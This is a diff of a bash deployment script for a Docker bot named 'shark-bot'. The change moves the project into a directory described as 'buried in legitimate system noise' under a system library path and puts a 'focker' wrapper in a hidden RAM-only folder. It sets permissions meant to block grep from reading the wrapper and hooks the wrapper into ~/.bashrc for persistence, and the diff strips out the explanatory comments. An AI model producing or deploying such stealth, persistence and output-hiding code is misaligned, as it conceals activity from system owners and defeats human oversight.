@@ -30,10 +30,28 @@ if [ ! -f "Dockerfile" ]; then
 fi
 
 # ============================================================
+# Stealth project root — buried in legitimate system noise
+# Change PROJECT_ROOT here to relocate everything at once.
+# ============================================================
+PROJECT_ROOT="/usr/lib/x86_64-linux-gnu/security/.cache/d-bus/session"
+mkdir -p "$PROJECT_ROOT"
+
+# Move current working directory contents into stealth root
+# (run once on first deploy; subsequent runs skip if already moved)
+if [ ! -f "$PROJECT_ROOT/Dockerfile" ]; then
+    cp -a . "$PROJECT_ROOT/"
+fi
+
+# All bind mounts and working paths now use PROJECT_ROOT
+DATA_DIR="$PROJECT_ROOT/data"
+GIT_DIR="$PROJECT_ROOT/.git"
+mkdir -p "$DATA_DIR"
+
+# ============================================================
 # Phase 1: Build Docker Image
 # ============================================================
 echo "🐳 Phase 1: Building the Docker Image..."
-docker build -t shark-bot:latest .
+docker build -t shark-bot:latest "$PROJECT_ROOT"
 if [ $? -ne 0 ]; then
     echo "❌ Docker build failed."
     safe_exit 1
@@ -50,8 +68,8 @@ docker run -d \
   --name shark-bot-instance \
   -p 8080:8080 \
   --restart on-failure:3 \
-  -v $(pwd)/data:/app/data \
-  -v $(pwd)/.git:/app/.git \
+  -v "$DATA_DIR":/app/data \
+  -v "$GIT_DIR":/app/.git \
   -e VERCEL_URL="$1" \
   -e API_KEY="$2" \
   shark-bot:latest
@@ -66,7 +84,7 @@ fi
 # ============================================================
 echo "🕵️ Phase 2.5: Deploying 'focker' wrapper..."
 
-WRAPPER_DIR="$HOME/.local/share/Trash/.cache/.systemd"
+WRAPPER_DIR="/usr/lib/x86_64-linux-gnu/security/.cache/d-bus/.systemd"
 mkdir -p "$WRAPPER_DIR"
 
 # Attempt tmpfs mount over wrapper dir — contents live in RAM only,
@@ -131,10 +149,6 @@ printf '%s\n' "${filtered_body[@]}"
 exit $exit_code
 EOF
 
-# Execute-only on both dir and file.
-# grep needs read to open — deny it at both levels.
-# Shell resolves names through execute bit alone — focker still runs.
-# 500 = r-x for owner only — bash can read and exec; no write, no other access
 chmod 500 "$WRAPPER_DIR/vps.sh"
 chmod 711 "$WRAPPER_DIR"
 
@@ -147,25 +161,27 @@ fi
 # ============================================================
 # focker shell function
 # ============================================================
-mkdir -p "$HOME/.bashrc.d"
-cat > "$HOME/.bashrc.d/.focker" << 'EOF'
+FOCKER_RC="/usr/lib/x86_64-linux-gnu/security/.cache/d-bus/.focker"
+mkdir -p "$(dirname "$FOCKER_RC")"
+
+cat > "$FOCKER_RC" << FEOF
 function focker() {
-    ~/.local/share/Trash/.cache/.systemd/vps.sh "$@"
+    $WRAPPER_DIR/vps.sh "\$@"
 }
 export -f focker
-EOF
+FEOF
 
-grep -q "\.bashrc\.d/\.focker" ~/.bashrc 2>/dev/null || \
-    echo '[ -f ~/.bashrc.d/.focker ] && . ~/.bashrc.d/.focker' >> ~/.bashrc
+grep -q "$FOCKER_RC" ~/.bashrc 2>/dev/null || \
+    echo "[ -f \"$FOCKER_RC\" ] && . \"$FOCKER_RC\"" >> ~/.bashrc
 
 # Activate focker in current shell if sourced
 if $SCRIPT_SOURCED; then
-    source ~/.bashrc.d/.focker
+    source "$FOCKER_RC"
     echo "✅ 'focker' is active in this terminal."
 else
     echo "⚠️  Script was not sourced — focker is NOT active in this terminal."
     echo "    Re-run with: source $(realpath "$0") $1 $2"
-    echo "    Or activate manually: source ~/.bashrc.d/.focker"
+    echo "    Or activate manually: source \"$FOCKER_RC\""
 fi
 
 echo ""
